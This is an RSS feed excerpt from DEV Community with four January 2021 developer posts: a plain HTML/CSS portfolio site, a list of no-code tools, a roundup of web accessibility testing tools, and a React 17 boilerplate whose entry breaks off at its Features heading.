<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>I built my Portfolio Website using nothing but HTML &amp; CSS!</title>
      <author>Fahad Imran</author>
      <pubDate>Sun, 03 Jan 2021 12:49:03 +0000</pubDate>
      <link>https://dev.to/codewithfahad/i-built-my-portfolio-website-using-nothing-but-html-css-5bjf</link>
      <guid>https://dev.to/codewithfahad/i-built-my-portfolio-website-using-nothing-but-html-css-5bjf</guid>
      <description>&lt;h3&gt;
  &lt;a href="#what-i-built" class="anchor"&gt;
  &lt;/a&gt;
  What I built
&lt;/h3&gt;

&lt;p&gt;I built a &lt;strong&gt;developer portfolio&lt;/strong&gt; showcasing my projects, tech stack, and more using plain HTML, CSS, and a bit of JavaScript. This project is also submitted to the &lt;strong&gt;DigitalOcean + DEV hackathon&lt;/strong&gt; and is deployed using DigitalOcean's App Platform.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#category-submission" class="anchor"&gt;
  &lt;/a&gt;
  Category Submission
&lt;/h3&gt;

&lt;p&gt;This project comes under the &lt;strong&gt;Personal Site/Portfolio&lt;/strong&gt; category of this hackathon.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#app-link" class="anchor"&gt;
  &lt;/a&gt;
  App Link
&lt;/h3&gt;

&lt;p&gt;The app has been deployed using DigitalOcean's App platform and can be viewed at this &lt;a href="https://portfolio-website-og7ee.ondigitalocean.app/"&gt;link&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#screenshots" class="anchor"&gt;
  &lt;/a&gt;
  Screenshots
&lt;/h3&gt;

&lt;p&gt;Here are some screenshots of the website for those interested: 😅&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--q56qIyny--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/2f0i3jn43modfyj66bx8.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--q56qIyny--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/2f0i3jn43modfyj66bx8.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FjWmnobH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/ospts187g2fqdl8py2rl.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FjWmnobH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/ospts187g2fqdl8py2rl.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vGOfz58r--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/b0eg2y71vzxqq18thntq.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vGOfz58r--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/b0eg2y71vzxqq18thntq.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--q21KZAC---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nturjpxfjerrdzzapg0w.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--q21KZAC---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nturjpxfjerrdzzapg0w.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#description" class="anchor"&gt;
  &lt;/a&gt;
  Description
&lt;/h3&gt;

&lt;p&gt;This is a simple portfolio website that can be used by developers. Nowadays, it is important to have a website that can showcase your skills, projects, work experience, and contact information. It is especially important for freelancers as it gives the &lt;strong&gt;potential clients&lt;/strong&gt; a one-stop-shop to find previously completed projects and contact information.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#link-to-source-code" class="anchor"&gt;
  &lt;/a&gt;
  Link to Source Code
&lt;/h3&gt;

&lt;p&gt;This project is &lt;strong&gt;open-sourced&lt;/strong&gt; and can be used by anyone. Link to the &lt;strong&gt;GitHub&lt;/strong&gt; repo: &lt;a href="https://github.com/codewithfahad/portfolio-website"&gt;https://github.com/codewithfahad/portfolio-website&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#permissive-license" class="anchor"&gt;
  &lt;/a&gt;
  Permissive License
&lt;/h3&gt;

&lt;p&gt;The project is licensed under the &lt;strong&gt;MIT&lt;/strong&gt; License.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#background" class="anchor"&gt;
  &lt;/a&gt;
  Background
&lt;/h3&gt;

&lt;p&gt;I wanted to have a portfolio website for quite some time. But I wasn't sure about a design so I kept on procrastinating. But when I heard about this hackathon, I knew this might well be my best chance at not only building this thing out but also participating in the hackathon in the process.&lt;/p&gt;

&lt;p&gt;Thus, I decided to skip the designing process in something like Figma and jump right into coding. Long story short, I was able to come up with a somewhat decent design and complete the website in a little over &lt;strong&gt;2&lt;/strong&gt; days.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-i-built-it" class="anchor"&gt;
  &lt;/a&gt;
  How I built it
&lt;/h3&gt;

&lt;p&gt;For building this website, my first inclination was to use &lt;strong&gt;React&lt;/strong&gt;. Since I have been using it to build other applications, I thought why not use it for this project as well.&lt;/p&gt;

&lt;p&gt;But at the last moment, I decided to go with nothing but simple &lt;strong&gt;HTML&lt;/strong&gt;, &lt;strong&gt;CSS&lt;/strong&gt;, and vanilla &lt;strong&gt;JS&lt;/strong&gt; for this website. I wanted to see what I can build without using any framework whatsoever. So, no React, no bootstrap, and no library of any kind was used to build this website. I believe that many applications can be built using these fundamental technologies without jumping into frameworks. &lt;/p&gt;

&lt;p&gt;So beginner web developers should not feel &lt;strong&gt;intimidated&lt;/strong&gt; that they don't know any frameworks. Because in most cases, plain HTML &amp;amp; CSS can do the trick!&lt;/p&gt;

&lt;p&gt;Things I learned when building this website:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Smooth Scroll&lt;/li&gt;
&lt;li&gt;Deployment to DigitalOcean&lt;/li&gt;
&lt;li&gt;CSS Grid and Flexbox usage&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Deployment was simple using &lt;strong&gt;DigitalOcean&lt;/strong&gt;. I signed up for an account and then was able to connect by GitHub to my DigitalOcean account. After that, it was as simple as choosing the correct repo, and voila! The site was published in seconds! 🥳🥳&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#additional-resourcesinfo" class="anchor"&gt;
  &lt;/a&gt;
  Additional Resources/Info
&lt;/h3&gt;

&lt;p&gt;For the design, I took inspiration from &lt;a href="https://lukenetti.com/"&gt;Luke Netti's portfolio&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For implementing smooth scroll functionality, I took help from the &lt;a href="https://webdesign.tutsplus.com/tutorials/smooth-scrolling-vanilla-javascript--cms-35165"&gt;following website&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#thats-all-folks" class="anchor"&gt;
  &lt;/a&gt;
  That's All Folks!
&lt;/h3&gt;

&lt;p&gt;That is all for this blog. Hope you enjoyed it. As always I would appreciate it if you follow me on Twitter &lt;a href="https://twitter.com/codewithfahad"&gt;@codewithfahad&lt;/a&gt;. You can find more of my blogs &lt;a href="https://codewithfahad.com"&gt;here&lt;/a&gt;. Thanks for reading and happy coding! 😃 &lt;/p&gt;

</description>
      <category>dohackathon</category>
      <category>webdev</category>
      <category>showdev</category>
      <category>javascript</category>
    </item>
    <item>
      <title>A list of actually useful Nocode tools and I am not talking about site builders.</title>
      <author>Fayaz Ahmed</author>
      <pubDate>Sun, 03 Jan 2021 08:31:36 +0000</pubDate>
      <link>https://dev.to/fayaz/a-list-of-actually-useful-nocode-tools-and-i-am-not-talking-about-site-builders-3m4g</link>
      <guid>https://dev.to/fayaz/a-list-of-actually-useful-nocode-tools-and-i-am-not-talking-about-site-builders-3m4g</guid>
      <description>&lt;p&gt;There's a lot of buzz going around the web dev world regarding Nocode, but a ton of these do the same thing and kind of miss the point of why they are to be used in the first place.&lt;/p&gt;

&lt;p&gt;These tools are not just another Website/App builder, but actual tools that will help you develop/scale your existing apps/websites which solve production use cases.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-pwabuilder" class="anchor"&gt;
  &lt;/a&gt;
  1.  &lt;a href="https://www.pwabuilder.com/"&gt;PWABuilder&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9jUArMWf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dyubax3rxhmdbxkks01i.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9jUArMWf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dyubax3rxhmdbxkks01i.jpg" alt="PWA Builder"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have used this and you will be surprised how well it works. The name says PWA Builder, but in fact it makes your PWAs - actual android apps which you can host on the Google play store, these are small light weight apps which are hardly like 1 - 2 MB in size.&lt;/p&gt;

&lt;p&gt;PS, they even have a neat PWA component library, like Auth, Contact Picker, Install component, which you can use in your PWAs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-appsmith" class="anchor"&gt;
  &lt;/a&gt;
  2. &lt;a href="https://www.appsmith.com/"&gt;Appsmith&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--C-HijEDJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6ocoi9yqcgv3q12zp6ef.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--C-HijEDJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6ocoi9yqcgv3q12zp6ef.png" alt="Appsmith"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another tool that I have fallen in love with recently, imagine building internal admin panels without code with charts, APIs, form collections, all with a drag and drop interface.&lt;/p&gt;

&lt;p&gt;You can even connect it directly to your Mysql, PGSQL databased right within this tool.&lt;/p&gt;

&lt;p&gt;I am surprised by how many complex use cases it handles.&lt;/p&gt;

&lt;p&gt;PS - it's all &lt;a href="https://github.com/appsmithorg/appsmith"&gt;open source&lt;/a&gt; and they even have the hosted version for free(for now).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-nocodeapi" class="anchor"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://nocodeapi.com"&gt;NoCodeApi&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UfpmkoLP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rfh9qz3j3y0xdprv4at8.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UfpmkoLP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rfh9qz3j3y0xdprv4at8.jpg" alt="NoCodeApi"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have been seeing NoCodeApi being built and grow since the beginning and I cannot stress enough how useful and polished this tool is, you need not read the docs of third party APIs, set up separate servers, write code, handle auth, tokens, API keys etc. All you need is an account and just get started using APIs from Google, Instagram, Twitter, Airtable, Slack and there are literally tons of other platform APIs you can use in your projects.&lt;/p&gt;

&lt;p&gt;PS, I have seen the next update of NoCodeApi and Danish is making something really amazing for developers called Dev APIs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-pipedream" class="anchor"&gt;
  &lt;/a&gt;
  4. &lt;a href="https://pipedream.com/"&gt;Pipedream&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CKdvTAMA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nbqgrummqd2hn6q553wf.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CKdvTAMA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nbqgrummqd2hn6q553wf.jpg" alt="Pipedream"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I am not exactly sure what to call this platform, because it does so many things you won't believe. Think of it like Zapier + IFTTT + Glitch + Firebase Database combines.&lt;/p&gt;

&lt;p&gt;It has all the automation magic and it gives you the complete flexibility of writing code, it even lets you add/edit their own hooks. Pipedream even allows you to save data on an actual database&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-letter" class="anchor"&gt;
  &lt;/a&gt;
  5. &lt;a href="https://letter.so/"&gt;Letter&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AFErIyir--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v0meu9w6nbejt3j302bo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--AFErIyir--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v0meu9w6nbejt3j302bo.png" alt="Letter"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;People sending newsletters, you know how hard it is to make good looking emails, letter is simple yet powerful, it can import data like images, titles, descriptions from links. right in their builder&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#6-mail-4-good" class="anchor"&gt;
  &lt;/a&gt;
  6. &lt;a href="https://github.com/freeCodeCamp/mail-for-good"&gt;Mail 4 Good&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---ZEffyvS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/138x41e3jrovr0kw9m1a.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---ZEffyvS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/138x41e3jrovr0kw9m1a.jpg" alt="Mail4Good"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For sending 10,000 emails, Mailchimp charges you $200, Mail4Good does it for $1 (I am not kidding). The thing is you need to host it yourself, it is open source and it uses Amazon SES behind the curtains which makes it so cheap.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#7-descript" class="anchor"&gt;
  &lt;/a&gt;
  7. &lt;a href="https://www.descript.com/"&gt;Descript&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--QEGAKZo1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/lptg15qvh2wdjr9618mn.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--QEGAKZo1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/lptg15qvh2wdjr9618mn.jpg" alt="Descript"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Descript is like magic for Independent video makers, it generates a transcript, editing videos is a breeze with this platform. Their website says &lt;strong&gt;video editor that works like a doc&lt;/strong&gt; and I could not agree more.&lt;/p&gt;

&lt;p&gt;Just look at their demo video and you will understand what I am talking about.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#8bannerbear" class="anchor"&gt;
  &lt;/a&gt;
  8.&lt;a href="https://www.bannerbear.com/"&gt;BannerBear&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--u_Xl5KJ2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/p8bi4unoac92kteh4i4n.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--u_Xl5KJ2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/p8bi4unoac92kteh4i4n.jpg" alt="BannerBear"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BannerBear automates Image generation for you, you just need to pass along some parameters to its API, and it will make the poster, image, text embedding, image resizing on the fly. &lt;/p&gt;

&lt;p&gt;You can even generate these images on the bulk by uploading them to Airtable or google sheets.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#9-super" class="anchor"&gt;
  &lt;/a&gt;
  9. &lt;a href="https://super.so/"&gt;Super&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JS4TDI6T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/x44sqbydbb79m8eb07z8.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JS4TDI6T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/x44sqbydbb79m8eb07z8.jpg" alt="Super"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Super lets you use Notion as your CMS. It even lets you connect custom domains to the site that is generated.&lt;/p&gt;

&lt;p&gt;Do consider supporting me by buying &lt;a href="https://fayazz.co/coffee"&gt;coffees&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you like my content do follow me on &lt;a href="https://twitter.com/fayazara"&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For paid articles on Javascript, APIs, SDK Integrations etc just DM on my twitter handle.&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>programming</category>
    </item>
    <item>
      <title>The best web accessibility tools for developers in 2021</title>
      <author>Jake Tracey</author>
      <pubDate>Sun, 03 Jan 2021 06:27:51 +0000</pubDate>
      <link>https://dev.to/jaketracey/the-best-web-accessibility-tools-for-developers-in-2021-8c8</link>
      <guid>https://dev.to/jaketracey/the-best-web-accessibility-tools-for-developers-in-2021-8c8</guid>
      <description>&lt;p&gt;The quality of the tools you use defines the speed with which you can diagnose and resolve problems. &lt;/p&gt;

&lt;p&gt;Each year the landscape changes dramatically in web technologies, and of late the tooling for accessibility is no exception.&lt;/p&gt;

&lt;p&gt;I’ve divided this article into 4 categories - resources, development tools, continuous integration and screen readers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#resources" class="anchor"&gt;
  &lt;/a&gt;
  Resources
&lt;/h2&gt;

&lt;p&gt;These are the pages that I keep bookmarked for reference and to learn new techniques.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility"&gt;Mozilla Accessibility Docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.w3.org/WAI/standards-guidelines/wcag/"&gt;W3C WCAG Guidelines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.smashingmagazine.com/category/accessibility"&gt;Smashing Magazine - Accessibility&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://css-tricks.com/tag/accessibility/"&gt;CSS Tricks - Accessibility&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are a number of great accessibility blogs on the web which I suggest browsing - a good jumping off point is available at &lt;a href="https://www.digitala11y.com/accessibility-blogs/"&gt;Digital A11y&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#development-tools" class="anchor"&gt;
  &lt;/a&gt;
  Development tools
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.deque.com/axe/"&gt;axe&lt;/a&gt; - axe has quickly become the defacto standard for automated accessibility testing. Deque's axe-core testing engine provides the under the hood implementation for most common tools, and they also provide a free Chrome extension that quickly identifies any in page errors for most common issues while providing guidance on how to resolve them. Definitely my first port of call when testing any new code. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://github.com/pa11y/pa11y"&gt;pa11y&lt;/a&gt; - pa11y is an automated testing tool based on axe-core that can be run on your development environment as part of your commit hooks or front-end build pipeline. It's extremely configurable so you can run automated tests for different accessibility standards and viewports, ignoring specific WCAG rule sets as well as triggering actions on pages as a part of your test suite. @f3igao's wonderful blog post, &lt;a href="https://medium.com/@f3igao/how-to-automate-web-accessibility-testing-921512bdd4bf"&gt;How to automate web accessibility testing&lt;/a&gt; is a great starting off point if you are looking to fully integrate pa11y with your front-end build.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://github.com/MSU-NatSci/DomainAccessibilityAudit"&gt;DomainAccessibilityAudit&lt;/a&gt; - I found this tool while researching ways to test an entire website for a11y issues and this was a perfect fit. You can feed it a root URL to start testing on and it will scrape all links on all subsequent pages and perform an audit, essentially crawling the entire site and producing a report of a11y issues. You can also input a sitemap.xml if you want to test a specific set of pages instead of crawling the entire site.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://accessibilityinsights.io/docs/en/web/overview/"&gt;Accessibility insights for web&lt;/a&gt; - Microsoft's commitment to accessible technologies shines with their free Chrome extension and provides another useful interface to the axe-core framework. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://chrome.google.com/webstore/detail/siteimprove-accessibility/efcfolpjihicnikpmhnmphjhhpiclljc"&gt;Siteimprove Accessibility Checker&lt;/a&gt; - The Siteimprove browser extension provides one of the most comprehensive interfaces to resolving issues with detailed recommendations on how to fix them. Highly recommended to keep in your toolbox.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.google.com/web/tools/lighthouse"&gt;Lighthouse&lt;/a&gt; - Don't have time or access to install software to run a quick a11y check? Lighthouse comes built in with Chrome DevTools and provides a fast, easy to understand issue checker that integrates perfectly with the Chrome browser. It also offers other suggestions in terms of improving page performance, server configuration and insights into using progressive web applications.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#continuous-integration" class="anchor"&gt;
  &lt;/a&gt;
  Continuous integration
&lt;/h2&gt;

&lt;p&gt;Catching issues before they are in production is one of the major benefits of adding accessibility tooling to your CI pipeline. Recently there has been huge progress in the ease of integration and reporting in this space, which I expect will continue to improve over the next year.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://github.com/pa11y/pa11y-ci"&gt;pa11y-ci&lt;/a&gt; - A set of command line tools for pa11y, pa11y-ci gives you the opportunity to run your suite of pa11y tests on your CI server. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://github.com/GoogleChrome/lighthouse-ci"&gt;lighthouse-ci&lt;/a&gt; - If you're looking to run a comprehensive set of tests in your CI environment, lighthouse-ci brings all the power of Google's Lighthouse app to the table. In addition to accessibility checks, lighthouse-ci will report on your app's performance, SEO and best practices in one of the most polished standalone reports available.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#screen-readers" class="anchor"&gt;
  &lt;/a&gt;
  Screen readers
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.freedomscientific.com/products/software/jaws/"&gt;JAWS&lt;/a&gt; - JAWS is the most popular and oldest screen reader that is still in use. It represents a huge proportion of screen reader users so it is an essential tool when testing for issues. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.nvaccess.org/about-nvda/"&gt;NVDA&lt;/a&gt; - NVDA is my screen reader of choice for testing because it's open source and free. It's also updated quite frequently and in my experience, has less quirks than JAWS. I expect in the coming years NVDA will overtake JAWS in terms of popularity, so if you were to pick one to learn, NVDA would be it.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://help.apple.com/voiceover/info/guide/"&gt;VoiceOver&lt;/a&gt; - VoiceOver is the defacto standard for screen readers on iOS and Mac OS X. It is extremely easy to use and the documentation is incredible. The vast majority of screen reader users on mobile are using VoiceOver so it is the most important tool you can use if a mobile audience is your primary demographic.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://support.google.com/accessibility/android/answer/6283677?hl=en"&gt;TalkBack&lt;/a&gt; - TalkBack is the Android OS screen reader. Similarly to VoiceOver, when developing for the mobile web, it is essential to test using TalkBack. Unfortunately, the OS version fragmentation on Android devices varies wildly, so it may be best in your particular scenario to test using a couple of versions older than the latest Android OS when conducting audits using TalkBack.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope you find this list helpful - each year I will add an additional update with any new tools I have discovered, and provide any comments on how the landscape is progressing.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Originally published at &lt;a href="https://jaketracey.com/best-web-accessibilty-tools-for-developers-2021/"&gt;jaketracey.com&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

</description>
      <category>a11y</category>
      <category>html</category>
      <category>css</category>
      <category>webdev</category>
    </item>
    <item>
      <title>My first public React 17 Boilerplate (with Webpack 5, Tailwind 2)</title>
      <author>Stefan Wuthrich</author>
      <pubDate>Sun, 03 Jan 2021 05:45:21 +0000</pubDate>
      <link>https://dev.to/golangch/my-first-public-react-boilerplate-with-wp-5-tailwind-2-28pc</link>
      <guid>https://dev.to/golangch/my-first-public-react-boilerplate-with-wp-5-tailwind-2-28pc</guid>
      <description>&lt;p&gt;I published my first React Boilerplate with React 17, Tailwind 2, using babel, sass, with a hot dev server and an optimized production build.&lt;br&gt;
Any feedback is welcome :-)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/altafino/react-webpack-5-tailwind-2"&gt;Github repo&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation" class="anchor"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git clone https://github.com:altafino/react-webpack-5-tailwind-2.git
cd react-webpack-5-tailwind-2
yarn / npm i
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#usage" class="anchor"&gt;
  &lt;/a&gt;
  Usage
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#development-server" class="anchor"&gt;
  &lt;/a&gt;
  Development server
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;yarn start / npm start
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;You can view the development server at &lt;code&gt;localhost:3000&lt;/code&gt;.&lt;br&gt;
(change port in ./config/webpack.dev.js)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#production-build" class="anchor"&gt;
  &lt;/a&gt;
  Production build
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt; yarn build / npm run build
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#features" class="anchor"&gt;
  &lt;/a&gt;
  Features
